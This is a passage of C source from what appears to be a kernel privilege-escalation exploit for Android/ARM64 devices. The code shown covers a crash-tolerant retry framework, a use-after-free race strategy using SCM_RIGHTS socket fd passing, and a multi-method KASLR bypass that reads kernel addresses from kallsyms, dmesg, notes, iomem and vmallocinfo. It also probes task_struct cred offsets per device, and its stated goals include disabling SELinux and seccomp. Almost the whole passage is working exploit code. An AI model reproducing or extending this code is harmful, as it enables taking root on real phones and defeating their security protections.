    write_int_safe(STDERR_FILENO, g_crash_phase);
    write(STDERR_FILENO, fmt4, sizeof(fmt4) - 1);

    /* Emergency cleanup */
    cleanup_all();

    /* Try to continue from jump point */
    if (g_in_exploit && g_crash_count < 5) {
        siglongjmp(g_exploit_jmp, 1);
    }

    /* Too many crashes, abort */
    static const char abort_msg[] = "Too many crashes, aborting\n";
    write(STDERR_FILENO, abort_msg, sizeof(abort_msg) - 1);
    _exit(1);
}

/* Register crash handlers for SIGSEGV, SIGBUS, SIGILL, SIGFPE */
static void register_crash_handlers(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = crash_handler;
    sigemptyset(&sa.sa_mask);
    sigaddset(&sa.sa_mask, SIGSEGV);
    sigaddset(&sa.sa_mask, SIGBUS);
    sigaddset(&sa.sa_mask, SIGILL);
    sigaddset(&sa.sa_mask, SIGFPE);
    sa.sa_flags = SA_NODEFER;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGILL, &sa, NULL);
    sigaction(SIGFPE, &sa, NULL);
}

/* Phase result */
#define PHASE_SKIPPED  (-1)
#define PHASE_FAILED   0
#define PHASE_OK       1

struct phase_state {
    int phase_id;
    const char *phase_name;
    int status;
    int attempt_count;
    struct timespec start_time;
    struct timespec end_time;
    int saved_errno;
};

#define MAX_PHASES 20
static struct phase_state g_phases[MAX_PHASES];
static int g_phase_count = 0;

static void phase_begin(int id, const char *name) {
    if (id >= MAX_PHASES) return;
    g_phase_count = id + 1;
    g_phases[id].phase_id = id;
    g_phases[id].phase_name = name;
    g_phases[id].status = PHASE_FAILED;
    g_phases[id].attempt_count = 0;
    clock_gettime(CLOCK_MONOTONIC, &g_phases[id].start_time);
    g_crash_phase = id;
    LOG_I("=== Phase %d: %s ===", id, name);
}

static void phase_end(int id, int status) {
    if (id >= MAX_PHASES) return;
    g_phases[id].status = status;
    g_phases[id].saved_errno = errno;
    clock_gettime(CLOCK_MONOTONIC, &g_phases[id].end_time);
    double elapsed = (g_phases[id].end_time.tv_sec - g_phases[id].start_time.tv_sec) +
                     (g_phases[id].end_time.tv_nsec - g_phases[id].start_time.tv_nsec) / 1e9;
    LOG_I("=== Phase %d: %s => %s (%.1fs, %d attempts) ===",
          id, g_phases[id].phase_name,
          status == PHASE_OK ? "OK" : status == PHASE_SKIPPED ? "SKIPPED" : "FAILED",
          elapsed, g_phases[id].attempt_count);
}

static int phase_should_retry(int id, int max_retries) {
    if (id >= MAX_PHASES) return 0;
    if (g_phases[id].attempt_count >= max_retries) return 0;
    g_phases[id].attempt_count++;
    return 1;
}

/* Health monitoring thread */
static volatile int g_health_ok = 1;
static volatile int g_oom_detected = 0;

static void *health_monitor(void *arg) {
    (void)arg;
    while (g_health_ok) {
        FILE *f = fopen("/proc/self/status", "r");
        if (f) {
            char line[256];
            while (fgets(line, sizeof(line), f)) {
                if (strstr(line, "VmRSS:")) {
                    unsigned long rss = 0;
                    sscanf(line, "VmRSS: %lu", &rss);
                    if (rss > 400000) {
                        LOG_W("Health: RSS=%lu kB — near OOM, cleaning spray", rss);
                        g_oom_detected = 1;
                        slab_spray_cleanup();
                        for (int j = 0; j < g_spray_count; j++) close(g_spray_fds[j]);
                        g_spray_count = 0;
                    }
                    break;
                }
            }
            fclose(f);
        }
        usleep(100000);
    }
    return NULL;
}

/* ========== DEVICE CAPABILITIES (populated by probe) ========== */
struct device_caps {
    int cpu_count;
    int total_ram_mb;
    int socketpair_latency_us;
    int recommended_attempts;
    int uptime_hours;
    int is_userdebug;
    int is_engineering;
    int is_selinux_enforcing;
    int cfi_detected;
    int kallsyms_accessible;
    int sched_debug_accessible;
    int dmesg_accessible;
    int notes_accessible;
    int iomem_accessible;
    int vmallocinfo_accessible;
    int kcore_accessible;
    int has_samsung_rkp;
    int has_pixel_cfi_precursor;
    int has_huawei_hardening;
    int has_xiaomi_hardening;
    int has_mtk_hardening;
    int has_qualcomm_hardening;
    int has_kirin_hardening;
    int seccomp_mode;
    int selinux_detailed;
    int lockdown_mode;
    int has_pointer_auth;
    int has_grsecurity;
    int aslr_bits;
    int has_kpti;
};

static struct device_caps g_dev;

/* ========== STRATEGY SELECTOR ========== */
struct exploit_strategy {
    /* KASLR methods in priority order (up to 5) */
    char kaslr_methods[5][32];
    int kaslr_count;

    /* arb_read methods in priority order */
    char arb_read_methods[3][32];
    int arb_read_count;

    /* arb_write methods in priority order */
    char arb_write_methods[3][32];
    int arb_write_count;

    /* UAF trigger method */
    char uaf_method[32];         /* "gc_race", "msg_msg", "setxattr" */
    int uaf_thread_count;
    int uaf_rearm_count;

    /* Post-exploitation */
    int disable_selinux_method;  /* 0=none, 1=arb_write, 2=function_call, 3=shellcode */
    int disable_seccomp;         /* 0/1 */
    int use_shellcode;           /* 0/1 */

    /* Timing */
    int race_delay_base_us;
    int race_delay_range_us;
    int max_attempts;
    int inflight_fds;

    /* Device-specific tuning */
    int slab_spray_count;
    int msg_spray_queues;
    int pipe_spray_count;
};

static struct exploit_strategy g_strat;

/* GC race synchronization */
static pthread_mutex_t g_cond_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t g_cond_gc = PTHREAD_COND_INITIALIZER;
static pthread_cond_t g_cond_recv = PTHREAD_COND_INITIALIZER;
static volatile int g_gc_signal = 0;
static volatile int g_recv_signal = 0;

/* ========== HELPERS ========== */
static int is_kernel_addr(unsigned long addr) {
#if defined(__LP64__)
    /* ARM64 kernel VA: 0xffff000000000000 - 0xffffffffffffffff */
    return (addr >= 0xffff000000000000UL && addr < 0xffffffffffffffffUL);
#else
    return (addr >= 0xffffffff80000000UL && addr < 0xffffffffffffffffUL);
#endif
}

static int get_uptime_hours(void) {
    FILE *f = fopen("/proc/uptime", "r");
    if (!f) return 0;
    double up = 0;
    if (fscanf(f, "%lf", &up) != 1) { fclose(f); return 0; }
    fclose(f);
    return (int)(up / 3600);
}

static int get_system_load(void) {
    FILE *f = fopen("/proc/loadavg", "r");
    if (!f) return 1;
    double load = 1.0;
    if (fscanf(f, "%lf", &load) != 1) { fclose(f); return 1; }
    fclose(f);
    return (int)(load * 100);
}

static void pin_cpu(int core) {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(core, &mask);
    if (sched_setaffinity(0, sizeof(mask), &mask) < 0)
        LOG_W("pin_cpu(%d) failed: %s", core, strerror(errno));
}

static void set_prio(int prio) {
    setpriority(PRIO_PROCESS, 0, prio);
}

__attribute__((unused)) static void set_rt(void) {
    struct sched_param sp = {.sched_priority = 99};
    if (sched_setscheduler(0, SCHED_FIFO, &sp) < 0)
        LOG_W("set_rt failed: %s", strerror(errno));
}

__attribute__((unused)) static int get_last_core(void) {
    static int cached = -1;
    if (cached >= 0) return cached;
    cached = 7;
    FILE *f = fopen("/sys/devices/system/cpu/possible", "r");
    if (f) {
        char buf[64];
        if (fgets(buf, sizeof(buf), f)) {
            int first, last;
            if (sscanf(buf, "%d-%d", &first, &last) == 2 && last >= 4)
                cached = last;
        }
        fclose(f);
    }
    return cached;
}

static void send_fd(int sock, int fd) {
    struct msghdr msg = {0};
    char ctl[CMSG_SPACE(sizeof(int))];
    struct iovec iov = {.iov_base = (char[1]){0}, .iov_len = 1};
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = ctl;
    msg.msg_controllen = sizeof(ctl);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    *(int *)CMSG_DATA(cmsg) = fd;
    if (sendmsg(sock, &msg, 0) < 0)
        LOG_T("send_fd(%d,%d) failed: %s", sock, fd, strerror(errno));
}

static void send_fds(int sock, int *fds, int num_fds, int num_iovs) {
    struct msghdr msg = {0};
    char ctl[CMSG_SPACE(num_fds * sizeof(int))];
    struct iovec iov[num_iovs];
    for (int i = 0; i < num_iovs; i++) {
        iov[i].iov_base = (char[1]){'A'};
        iov[i].iov_len = 2;
    }
    msg.msg_iov = iov;
    msg.msg_iovlen = num_iovs;
    msg.msg_control = ctl;
    msg.msg_controllen = sizeof(ctl);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(num_fds * sizeof(int));
    memcpy(CMSG_DATA(cmsg), fds, num_fds * sizeof(int));
    if (sendmsg(sock, &msg, 0) < 0)
        LOG_T("send_fds failed: %s", strerror(errno));
}

static void measure_baseline(void) {
    LOG_I("Measuring system baseline...");
    g_baseline.uptime_hours = get_uptime_hours();
    g_baseline.system_load = get_system_load();
    struct timespec start, end;
    int pairs[5][2];
    clock_gettime(CLOCK_MONOTONIC, &start);
    for (int i = 0; i < 5; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, pairs[i]) < 0) {
            g_baseline.socketpair_us = 1000;
            return;
        }
    }
    clock_gettime(CLOCK_MONOTONIC, &end);
    long ns = (end.tv_sec - start.tv_sec) * 1000000000L + (end.tv_nsec - start.tv_nsec);
    g_baseline.socketpair_us = (int)(ns / 5000);
    for (int i = 0; i < 5; i++) { close(pairs[i][0]); close(pairs[i][1]); }
    LOG_D("Baseline: socketpair=%dus load=%d uptime=%dh",
          g_baseline.socketpair_us, g_baseline.system_load, g_baseline.uptime_hours);
}

/* Forward declarations for functions defined later in this file */
static int try_kaslr_bruteforce(void);
static unsigned long arb_read(unsigned long addr);
static int arb_write(unsigned long addr, unsigned long val);

/* Forward declarations for fallback chain methods */
static unsigned long try_pipe_read(unsigned long addr);
static unsigned long try_kallsyms_kcore_read(unsigned long addr);
static int try_msg_msg_write(unsigned long addr, unsigned long val);
static int try_pipe_buffer_write(unsigned long addr, unsigned long val);
static int try_pipe_buf_ops_hijack(unsigned long addr, unsigned long val);
static int try_kmem_write(void);
static int try_commit_creds_shellcode(void);
static void cleanup_all(void);
static void cleanup_fake_pipe(void);
static int verify_root(void);
static void generate_race_delays(int *delays, int *n_delays, int base_us, int range_us);
/* ========== KASLR DEFEAT ========== */
static int try_kallsyms_leak(void) {
    int used_popen = 0;
    FILE *fp = fopen("/proc/kallsyms", "r");
    if (!fp) {
        /* Fallback 1: check if kptr_restrict can be lowered */
        int kptr_fd = open("/proc/sys/kernel/kptr_restrict", O_WRONLY);
        if (kptr_fd >= 0) {
            if (write(kptr_fd, "0", 1) > 0) {
                close(kptr_fd);
                fp = fopen("/proc/kallsyms", "r");
            } else {
                close(kptr_fd);
            }
        }
        if (!fp) {
            /* Fallback 2: try reading kallsyms via shell workaround */
            fp = popen("cat /proc/kallsyms 2>/dev/null || echo 0", "r");
            if (!fp) return 0;
            used_popen = 1;
        }
    }
    char line[256], sym[256];
    unsigned long addr;
    int found = 0;
    while (fgets(line, sizeof(line), fp)) {
        if (sscanf(line, "%lx %*c %255s", &addr, sym) == 2 && addr) {
            if (strcmp(sym, "commit_creds") == 0 && !offsets.commit_creds)
                { offsets.commit_creds = addr; found = 1; }
            else if (strcmp(sym, "prepare_kernel_cred") == 0 && !offsets.prepare_kernel_cred)
                { offsets.prepare_kernel_cred = addr; found = 1; }
            else if (strcmp(sym, "init_task") == 0 && !offsets.init_task)
                { offsets.init_task = addr; found = 1; }
            else if (strcmp(sym, "pipe_buf_ops") == 0 && !offsets.pipe_buf_ops)
                { offsets.pipe_buf_ops = addr; g_pipe_buf_confirmed = 1; found = 1; }
            else if (strcmp(sym, "anon_pipe_buf_ops") == 0 && !offsets.anon_pipe_buf_ops)
                { offsets.anon_pipe_buf_ops = addr; if (!offsets.pipe_buf_ops) { offsets.pipe_buf_ops = addr; g_pipe_buf_confirmed = 1; } found = 1; }
            else if (strcmp(sym, "_text") == 0 && !kernel_base)
                { kernel_base = addr & 0xffffffc000000000UL; if (!kernel_base) kernel_base = addr & 0xfffffffffff00000UL; }
        }
    }
    if (used_popen)
        pclose(fp);
    else
        fclose(fp);
    if (found && offsets.commit_creds) {
        kernel_base = offsets.commit_creds & 0xffffffc000000000UL;
        if (!kernel_base) kernel_base = offsets.commit_creds & 0xfffffffffff00000UL;
        LOG_I("Kernel base from kallsyms: 0x%lx", kernel_base);
        return 1;
    }
    return 0;
}

static int try_sched_debug(void) {
    FILE *fp = fopen("/proc/sched_debug", "r");
    if (!fp) return 0;
    char line[512];
    unsigned long addr;
    while (fgets(line, sizeof(line), fp)) {
        /* Try multiple format patterns */
        if (sscanf(line, ".init_task : %lx", &addr) == 1 ||
            sscanf(line, "init_task = %lx", &addr) == 1 ||
            sscanf(line, ".init_task = %lx", &addr) == 1 ||
            sscanf(line, "init_task addr = %lx", &addr) == 1) {
            if (addr && is_kernel_addr(addr)) {
                offsets.init_task = addr;
                kernel_base = addr & 0xffffffc000000000UL;
                if (!kernel_base) kernel_base = addr & 0xfffffffffff00000UL;
                LOG_I("init_task from sched_debug: 0x%lx", addr);
                fclose(fp);
                return 1;
            }
        }
        /* Raw hex address extraction near "init_task" */
        if (strstr(line, "init_task")) {
            char *p = line;
            while (*p) {
                if ((*p >= '0' && *p <= '9') || (*p >= 'a' && *p <= 'f') || (*p >= 'A' && *p <= 'F')) {
                    char *end;
                    addr = strtoull(p, &end, 16);
                    if (addr && is_kernel_addr(addr)) {
                        offsets.init_task = addr;
                        kernel_base = addr & 0xffffffc000000000UL;
                        if (!kernel_base) kernel_base = addr & 0xfffffffffff00000UL;
                        LOG_I("init_task from sched_debug (raw): 0x%lx", addr);
                        fclose(fp);
                        return 1;
                    }
                    p = end;
                } else { p++; }
            }
        }
    }
    fclose(fp);
    return 0;
}

static int try_dmesg_leak(void) {
    FILE *fp = popen("dmesg 2>/dev/null | tail -500", "r");
    if (!fp) return 0;
    char line[1024], sym[256];
    unsigned long addr;
    int found = 0;
    int lines_parsed = 0;
    while (fgets(line, sizeof(line), fp)) {
        lines_parsed++;
        /* Pattern 1: symbol name + address (standard) */
        if (sscanf(line, "%*s %*s %255s %lx", sym, &addr) >= 2 ||
            sscanf(line, "%*s %255s %lx", sym, &addr) >= 2) {
            if (addr && is_kernel_addr(addr)) {
                if (strstr(sym, "commit_creds") && !offsets.commit_creds)
                    { offsets.commit_creds = addr; found = 1; }
                else if (strstr(sym, "init_task") && !offsets.init_task)
                    { offsets.init_task = addr; found = 1; }
                else if (strstr(sym, "prepare_kernel_cred") && !offsets.prepare_kernel_cred)
                    { offsets.prepare_kernel_cred = addr; found = 1; }
            }
        }
        /* Pattern 2: hex address in known ranges (no symbol needed) */
        char *p = line;
        while ((p = strstr(p, "0x")) != NULL) {
            char *end;
            addr = strtoull(p + 2, &end, 16);
            if (addr && is_kernel_addr(addr) && !offsets.init_task) {
                /* Could be any kernel address - store as candidate */
                offsets.init_task = addr;
                kernel_base = addr & 0xffffffc000000000UL;
                if (!kernel_base) kernel_base = addr & 0xfffffffffff00000UL;
                LOG_D("Potential init_task from dmesg hex: 0x%lx", addr);
                found = 1;
            }
            p = end;
            if (!*p) break;
        }
        if (found && offsets.commit_creds) break;
    }
    pclose(fp);
    if (!found && lines_parsed == 0) {
        /* Try alternative dmesg reading via /dev/kmsg */
        FILE *kmsg = fopen("/dev/kmsg", "r");
        if (kmsg) {
            char kbuf[2048];
            while (fgets(kbuf, sizeof(kbuf), kmsg) && !found) {
                if (sscanf(kbuf, "%*d,%*d,%*d,%*d,%*c%255s %lx", sym, &addr) >= 2 ||
                    sscanf(kbuf, "%*[^,],%*[^,],%*[^,],%*[^,],%*c%255s %lx", sym, &addr) >= 2) {
                    if (addr && is_kernel_addr(addr)) {
                        if (strstr(sym, "commit_creds") && !offsets.commit_creds)
                            { offsets.commit_creds = addr; found = 1; }
                        else if (strstr(sym, "init_task") && !offsets.init_task)
                            { offsets.init_task = addr; found = 1; }
                    }
                }
            }
            fclose(kmsg);
        }
    }
    if (found && offsets.commit_creds) {
        kernel_base = offsets.commit_creds & 0xffffffc000000000UL;
        if (!kernel_base) kernel_base = offsets.commit_creds & 0xfffffffffff00000UL;
        LOG_I("Kernel base from dmesg: 0x%lx", kernel_base);
        return 1;
    }
    if (found && offsets.init_task && !kernel_base) {
        kernel_base = offsets.init_task & 0xffffffc000000000UL;
        if (!kernel_base) kernel_base = offsets.init_task & 0xfffffffffff00000UL;
        return 1;
    }
    return 0;
}

static int try_notes_leak(void) {
    FILE *fp = fopen("/sys/kernel/notes", "r");
    if (!fp) return 0;
    char buf[8192];
    int n = fread(buf, 1, sizeof(buf), fp);
    fclose(fp);
    if (n <= 0) return 0;
    /* Scan byte-by-byte for kernel pointers */
    int ptrs_found = 0;
    unsigned long first_ptr = 0;
    for (int i = 0; i < n - 8; i++) {
        unsigned long val = *(unsigned long *)&buf[i];
        if (is_kernel_addr(val)) {
            if (!ptrs_found++) first_ptr = val;
            LOG_D("notes ptr[%d]: 0x%lx", i, val);
        }
    }
    if (ptrs_found >= 3) {
        /* Multiple kernel pointers in notes - compute likely base */
        unsigned long min_ptr = ~0UL, max_ptr = 0;
        for (int i = 0; i < n - 8; i++) {
            unsigned long val = *(unsigned long *)&buf[i];
            if (is_kernel_addr(val)) {
                if (val < min_ptr) min_ptr = val;
                if (val > max_ptr) max_ptr = val;
            }
        }
        kernel_base = min_ptr & 0xffffffc000000000UL;
        if (!kernel_base) kernel_base = min_ptr & 0xfffffffffff00000UL;
        LOG_I("Kernel base from notes: 0x%lx (min=0x%lx max=0x%lx count=%d)",
              kernel_base, min_ptr, max_ptr, ptrs_found);
        return 1;
    }
    if (first_ptr) {
        kernel_base = first_ptr & 0xffffffc000000000UL;
        if (!kernel_base) kernel_base = first_ptr & 0xfffffffffff00000UL;
        LOG_I("Kernel base from notes (single): 0x%lx", kernel_base);
        return 1;
    }
    return 0;
}

static int try_iomem_leak(void) {
    FILE *fp = fopen("/proc/iomem", "r");
    if (!fp) return 0;
    char line[256];
    unsigned long start, end;
    while (fgets(line, sizeof(line), fp)) {
        /* Look for "Kernel code" which often shows the kernel virtual address range */
        if (strstr(line, "Kernel code") || strstr(line, "kernel_code") ||
            strstr(line, "Kernel data") || strstr(line, "kernel_data")) {
            if (sscanf(line, "%lx-%lx", &start, &end) >= 1 && is_kernel_addr(start)) {
                kernel_base = start & 0xffffffc000000000UL;
                if (!kernel_base) kernel_base = start & 0xfffffffffff00000UL;
                LOG_I("Kernel base from iomem: 0x%lx (range 0x%lx-0x%lx)", kernel_base, start, end);
                fclose(fp);
                return 1;
            }
        }
        /* Some kernels show the virtual address directly */
        if (sscanf(line, " %lx-%lx : Kernel", &start, &end) >= 2 ||
            sscanf(line, " %lx-%lx : kernel", &start, &end) >= 2) {
            if (is_kernel_addr(start)) {
                kernel_base = start & 0xffffffc000000000UL;
                if (!kernel_base) kernel_base = start & 0xfffffffffff00000UL;
                LOG_I("Kernel base from iomem (direct): 0x%lx", kernel_base);
                fclose(fp);
                return 1;
            }
        }
        /* Also check for "Reserved" ranges matching kernel space */
        if (strstr(line, "Reserved") && strstr(line, "ffff")) {
            if (sscanf(line, "%lx-%lx", &start, &end) >= 2 && is_kernel_addr(start)) {
                kernel_base = start & 0xffffffc000000000UL;
                if (!kernel_base) kernel_base = start & 0xfffffffffff00000UL;
                LOG_I("Kernel base from iomem reserved: 0x%lx", kernel_base);
                fclose(fp);
                return 1;
            }
        }
    }
    fclose(fp);
    return 0;
}

static int try_vmallocinfo_leak(void) {
    FILE *fp = fopen("/proc/vmallocinfo", "r");
    if (!fp) return 0;
    char line[512];
    unsigned long addr;
    while (fgets(line, sizeof(line), fp)) {
        if (sscanf(line, "%lx", &addr) == 1 && is_kernel_addr(addr)) {
            /* Check for kernel image mapping entries */
            if (strstr(line, "kernel_end") || strstr(line, "kernel_init") ||
                strstr(line, "_text") || strstr(line, "_end") ||
                strstr(line, "start_kernel") || strstr(line, "vmlinux")) {
                kernel_base = addr & 0xffffffc000000000UL;
                if (!kernel_base) kernel_base = addr & 0xfffffffffff00000UL;
                LOG_I("Kernel base from vmallocinfo: 0x%lx", kernel_base);
                fclose(fp);
                return 1;
            }
        }
    }
    fclose(fp);
    return 0;
}

static int try_cpu_kallsyms(void) {
    if (try_notes_leak()) return 1;
    if (try_iomem_leak()) return 1;
    if (try_vmallocinfo_leak()) return 1;
    /* Try /proc/config.gz - read decompressed and search for base hints */
    FILE *cfg = popen("zcat /proc/config.gz 2>/dev/null | grep -i page_offset", "r");
    if (cfg) {
        char line[256];
        unsigned long val;
        while (fgets(line, sizeof(line), cfg)) {
            if (sscanf(line, "CONFIG_PAGE_OFFSET=%lx", &val) == 1 ||
                sscanf(line, "CONFIG_KASLR=%lx", &val) == 1) {
                LOG_D("config: %s", line);
            }
        }
        pclose(cfg);
    }
    /* Try /sys/kernel/kexec_crash_loaded or similar sysfs nodes */
    {
        FILE *f = fopen("/sys/kernel/kexec_crash_size", "r");
        if (f) { fclose(f); }
    }
    return 0;
}

static unsigned long leak_kernel_base(void) {
    LOG_I("Starting KASLR defeat (chain)...");

    struct kaslr_method {
        const char *name;
        int (*func)(void);
        int priority;
    };

    struct kaslr_method chain[8];
    int n = 0;

    if (g_dev.kallsyms_accessible) {
        chain[n++] = (struct kaslr_method){"kallsyms", try_kallsyms_leak, 10};
    }
    chain[n++] = (struct kaslr_method){"sched_debug", try_sched_debug, 20};

    if (g_dev.dmesg_accessible) {
        chain[n++] = (struct kaslr_method){"dmesg", try_dmesg_leak, 30};
    }
    chain[n++] = (struct kaslr_method){"notes", try_notes_leak, 40};
    chain[n++] = (struct kaslr_method){"iomem", try_iomem_leak, 50};

    if (g_dev.is_userdebug) {
        chain[n++] = (struct kaslr_method){"vmallocinfo", try_vmallocinfo_leak, 55};
    }
    chain[n++] = (struct kaslr_method){"bruteforce", try_kaslr_bruteforce, 100};

    for (int i = 0; i < n; i++) {
        for (int j = i + 1; j < n; j++) {
            if (chain[j].priority < chain[i].priority) {
                struct kaslr_method tmp = chain[i];
                chain[i] = chain[j];
                chain[j] = tmp;
            }
        }
        g_attempt_stats.best_progress_phase = i;
        clock_gettime(CLOCK_MONOTONIC, &g_attempt_stats.phase_times[i]);
        LOG_I("KASLR: trying method %d/%d: %s", i + 1, n, chain[i].name);
        if (chain[i].func()) {
            LOG_I("KASLR: %s succeeded (base=0x%lx)", chain[i].name, kernel_base);
            if (!offsets.pipe_buf_ops && g_dev.kallsyms_accessible) {
                try_kallsyms_leak();
            }
            g_attempt_stats.best_progress_phase = 9;
            return kernel_base;
        }
        LOG_D("KASLR: %s failed, trying next", chain[i].name);
    }

    LOG_E("All KASLR methods failed");
    return 0;
}

/* ========== DEVICE OFFSET DETECTION ========== */
static int auto_probe_cred_offset(void) {
    if (!kernel_base || !offsets.init_task) return 0;
    /* Common cred offsets in task_struct, expanded list */
    unsigned long candidates[] = {
        0x4e0, 0x4e8, 0x4f0, 0x4f8,   /* kernels 4.4 */
        0x580, 0x588, 0x590, 0x598,   /* kernels 4.4-4.9 */
        0x5a0, 0x5a8, 0x5b0, 0x5b8, 0x5bc, 0x5c0, 0x5c8, 0x5d0, 0x5d8, 0x5e0, /* 4.9-4.14 */
        0x618, 0x620, 0x628, 0x630, 0x638, 0x640, 0x648, /* 4.19-5.4 */
        0x6a0, 0x6a8, 0x6b0, 0x6b8, 0x6c0, 0x6c8, 0x6d0, 0x6d8, /* 5.4-5.10 */
        0x6e0, 0x6e8, 0x6f0,           /* 5.10+ */
        0x700, 0x708, 0x710, 0x718,   /* 5.15+ */
    };
    /* Determine kernel version for more targeted probing */
    struct utsname uts;
    if (uname(&uts) != 0) uts.release[0] = 0;
    /* First, check device DB offsets if we have them, to validate */
    for (int d = 0; d < device_offset_count; d++) {
        unsigned long test_cred = arb_read(offsets.init_task + device_offset_db[d].cred_off);
        if (is_kernel_addr(test_cred)) {
            unsigned long uid_raw = arb_read(test_cred + 4);
            if ((uid_raw & 0xffffffff) == 0) {
                offsets.task_struct_cred = device_offset_db[d].cred_off;
                LOG_I("Auto-probed cred offset via DB hint: 0x%lx", device_offset_db[d].cred_off);
                return 1;
            }
        }
    }
    for (size_t i = 0; i < sizeof(candidates)/sizeof(candidates[0]); i++) {
        unsigned long cred = arb_read(offsets.init_task + candidates[i]);
        if (is_kernel_addr(cred)) {
            /* cred struct starts with a refcount (atomic_t = 4 bytes) + uid/gid/etc.
             * Check if the uid field at offset 4 looks reasonable (uid_t 0).
             * Also verify euid (offset 0x14 typically) is also 0 for init_task. */
            unsigned long uid_raw = arb_read(cred + 4);
            unsigned int uid = (unsigned int)(uid_raw & 0xffffffff);
            unsigned long euid_raw = arb_read(cred + 0x14);
            unsigned int euid = (unsigned int)(euid_raw & 0xffffffff);
            if (uid == 0 && euid == 0) {
                LOG_I("Auto-probed cred offset: 0x%lx (cred=0x%lx uid=%u euid=%u)",
                      candidates[i], cred, uid, euid);
                offsets.task_struct_cred = candidates[i];
                return 1;
            }
            /* Single check fallback */
            if (uid == 0 && !offsets.task_struct_cred) {
                offsets.task_struct_cred = candidates[i];
                LOG_D("Probed cred offset (single verify): 0x%lx", candidates[i]);
                return 1;
            }
        }
    }
    return 0;
}

static int match_offsets_from_db(const char *build_fp) {
    LOG_I("Matching device: %s", build_fp ? build_fp : "unknown");
    int best = -1, best_rel = 0;
    struct utsname uts;
    const char *kver = "";
    if (uname(&uts) == 0) kver = uts.release;

    /* Phase 1: Match by build fingerprint (device-specific) */
    if (build_fp && *build_fp) {
        for (int i = 0; i < device_offset_count; i++) {
            if (strcasestr(build_fp, device_offset_db[i].build_sub)) {
                if (device_offset_db[i].reliability > best_rel) {
                    best = i;
                    best_rel = device_offset_db[i].reliability;
                }
            }
        }
    }

    /* Phase 2: Match by kernel version alone (for generic fallback) */
    if (best < 0 || best_rel < 50) {
        for (int i = 0; i < device_offset_count; i++) {
            if (device_offset_db[i].build_sub[0] == 'd' &&
                strstr(device_offset_db[i].build_sub, "default")) {
                const char *db_ver = device_offset_db[i].kernel_ver;
                if (kver && *kver && strstr(kver, db_ver)) {
                    int rel = device_offset_db[i].reliability;
                    if (rel > best_rel) {
                        best = i;
                        best_rel = rel;
                        LOG_D("Kernel version match: %s -> %s (rel=%d%%)",
                              kver, device_offset_db[i].build_sub, rel);
                    }
                }
            }
        }
    }

    /* Phase 3: Match by kernel version substring in device entries */
    if (best < 0 || best_rel < 40) {
        for (int i = 0; i < device_offset_count; i++) {
            const char *db_ver = device_offset_db[i].kernel_ver;
            if (kver && *kver && strstr(kver, db_ver)) {
                int rel = device_offset_db[i].reliability;
                /* Prefer exact sub-model match within same kernel version */
                if (build_fp && *build_fp && strcasestr(build_fp, device_offset_db[i].build_sub))
                    rel += 10;
                if (rel > best_rel) {
                    best = i;
                    best_rel = rel;
                }
            }
        }
    }

    if (best >= 0) {
        const struct device_offset_entry *m = &device_offset_db[best];
        LOG_I("Device match: %s (rel=%d%%)", m->build_sub, m->reliability);
        offsets.task_struct_cred = m->cred_off;
        offsets.task_struct_pid = m->pid_off;
        offsets.task_struct_tasks = m->tasks_off;
        offsets.task_struct_comm = m->comm_off;
        if (kernel_base) {
            offsets.init_task = kernel_base + m->init_task_off;
            offsets.pipe_buf_ops = kernel_base + m->pipe_buf_ops_off;
            g_pipe_buf_confirmed = (m->reliability >= 85);
            LOG_I("Offsets: init_task=0x%lx pipe_buf_ops=0x%lx confirmed=%d",
                  offsets.init_task, offsets.pipe_buf_ops, g_pipe_buf_confirmed);
        }
        return 1;
    }

    LOG_W("No device match in database, trying auto-probe...");
    if (auto_probe_cred_offset()) return 1;
    return 0;
}

/* ========== USERFAULTFD SETUP (for pipe primitive) ========== */
static int setup_userfaultfd(void) {
    int ret = -1;
    g_uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (g_uffd < 0) { g_has_userfaultfd = 0; LOG_W("userfaultfd unavailable"); goto cleanup; }
    struct uffdio_api api = {.api = UFFD_API, .features = 0};
    if (ioctl(g_uffd, UFFDIO_API, &api) < 0) { goto cleanup; }
    g_uffd_page = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (g_uffd_page == MAP_FAILED) { g_uffd_page = NULL; goto cleanup; }
    struct uffdio_register reg = {.range.start = (unsigned long)g_uffd_page, .range.len = 0x1000, .mode = UFFDIO_REGISTER_MODE_MISSING};
    if (ioctl(g_uffd, UFFDIO_REGISTER, &reg) < 0) { munmap(g_uffd_page, 0x10000); g_uffd_page = NULL; goto cleanup; }
    g_has_userfaultfd = 1;
    LOG_I("userfaultfd ready");
    return 0;
cleanup:
    if (g_uffd >= 0) { close(g_uffd); g_uffd = -1; }
    if (g_uffd_page) { munmap(g_uffd_page, 0x10000); g_uffd_page = NULL; }
    g_has_userfaultfd = 0;
    return ret;
}

/* ========== KASLR BRUTEFORCE (when leaks fail) ========== */
#define BRUTEFORCE_BASE_MIN 0xffffffc000000000UL
#define BRUTEFORCE_BASE_MAX 0xffffffc080000000UL
#define BRUTEFORCE_STEP_FAST 0x20000000UL

/* Known init_task offsets from kernel base per kernel version */
static const struct {
    const char *ver;
    unsigned long init_off;
    unsigned long pid_off;
} init_off_db[] = {
    {"4.4",  0xc40000, 0x498},
    {"4.9",  0xc40000, 0x498},
    {"4.14", 0xc60000, 0x4b0},
    {"4.19", 0xca0000, 0x4b8},
    {"5.4",  0xd00000, 0x558},
    {"5.10", 0xd20000, 0x568},
};

static int verify_kernel_base(unsigned long candidate) {
    /* Verification 1: Check for valid AArch64 instruction pattern at base */
    int kcore = open("/proc/kcore", O_RDONLY);
    if (kcore < 0) return 0;

    /* Read first 32 bytes of kernel text */
    unsigned char text_buf[32];
